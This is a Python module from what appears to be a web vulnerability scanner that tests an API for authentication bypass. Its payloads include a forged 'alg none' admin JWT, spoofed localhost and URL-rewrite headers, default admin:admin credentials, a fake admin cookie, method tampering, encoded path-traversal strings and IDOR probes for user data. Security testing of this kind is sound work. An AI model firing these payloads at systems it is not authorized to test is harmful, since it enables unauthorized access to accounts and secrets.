from __future__ import annotations

import json
import urllib.parse
from typing import Any, Dict, List
from ..http import http_probe, Finding


AUTH_BYPASS_PATHS = [
    "/api/v1/users", "/api/users", "/api/v1/me",
    "/api/v1/admin/users", "/api/admin", "/api/v1/config",
    "/api/v1/secrets", "/api/v1/keys", "/api/v1/tokens",
    "/api/v1/internal", "/api/debug", "/api/status",
    "/api/health", "/.well-known/openid-configuration",
]

AUTH_HEADERS = [
    {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."},
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"Referer": "https://localhost/admin"},
    {"X-Real-IP": "127.0.0.1"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
    {"X-Api-Key": ""},
    {"X-Access-Token": ""},
    {"Cookie": "session=admin; role=admin"},
]


def run_auth(target: str, base_url: str, timeout: int = 8,
              verify_tls: bool = True) -> List[Finding]:
    """15 auth bypass techniques. Returns list of Findings."""
    findings: List[Finding] = []
    host = target.replace("https://", "").replace("http://", "").split("/")[0]

    def add(title, severity, desc, evidence, pts=0):
        findings.append(Finding(
            title=title, severity=severity, category="auth_bypass",
            module="auth", description=desc, evidence=evidence,
            asset=host, points_deducted=pts,
            remediation="Implement proper authentication middleware. Validate tokens server-side.",
        ))

    # Technique 1-12: Header-based bypasses against sensitive endpoints
    for path in AUTH_BYPASS_PATHS[:6]:
        url = base_url.rstrip("/") + path
        for i, headers in enumerate(AUTH_HEADERS):
            resp = http_probe(url, headers=headers, timeout=timeout, verify_tls=verify_tls)
            status = resp.get("status", 0)
            body = resp.get("body", "")[:2048].lower()

            if status == 200 and len(body) > 20:
                is_protected = any(kw in body for kw in [
                    "unauthorized", "forbidden", "401", "403", "login required"
                ])
                if not is_protected:
                    header_name = list(headers.keys())[0] if headers else "none"
                    add(
                        f"Auth bypass via {header_name} on {path}",
                        "critical" if "admin" in path.lower() else "high",
                        f"Endpoint {path} accessible with suspicious {header_name} header",
                        f"{header_name} header bypassed auth -> 200 OK",
                        15 if "admin" in path.lower() else 10,
                    )
                    break  # One bypass per endpoint is enough

    # Technique 13: HTTP method tampering
    for path in ["/api/v1/users", "/admin", "/api/v1/config"]:
        url = base_url.rstrip("/") + path
        for method in ["OPTIONS", "PUT", "DELETE", "PATCH"]:
            resp = http_probe(url, method=method, timeout=timeout, verify_tls=verify_tls)
            if resp.get("status") == 200:
                add(
                    f"Method tampering: {method} {path}",
                    "high",
                    f"{method} method returns 200 on {path} — may bypass auth checks",
                    f"{method} {path} -> 200",
                    10,
                )
                break

    # Technique 14: Path traversal to admin
    traversal_paths = [
        "/api/v1/../admin", "/api/..%2fadmin",
        "/static/..%2f..%2fadmin", "/%2e%2e/admin",
    ]
    for tp in traversal_paths:
        url = base_url.rstrip("/") + tp
        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
        if resp.get("status") == 200 and len(resp.get("body", "")) > 20:
            add(
                f"Path traversal: {tp}",
                "critical",
                f"Path traversal bypassed access controls: {tp}",
                f"GET {tp} -> 200",
                15,
            )
            break

    # Technique 15: IDOR probe
    for id_val in ["1", "admin", "me", "0"]:
        for path in ["/api/v1/users/", "/api/users/", "/api/v1/accounts/"]:
            url = base_url.rstrip("/") + path + id_val
            resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
            if resp.get("status") == 200:
                body = resp.get("body", "")[:1024]
                if any(kw in body.lower() for kw in ["email", "password", "secret", "token", "key"]):
                    add(
                        f"Potential IDOR: {path}{id_val}",
                        "critical",
                        f"User data accessible without auth via IDOR: {path}{id_val}",
                        f"GET {path}{id_val} -> 200 (sensitive data)",
                        15,
                    )
                    break
        else:
            continue
        break

    return findings
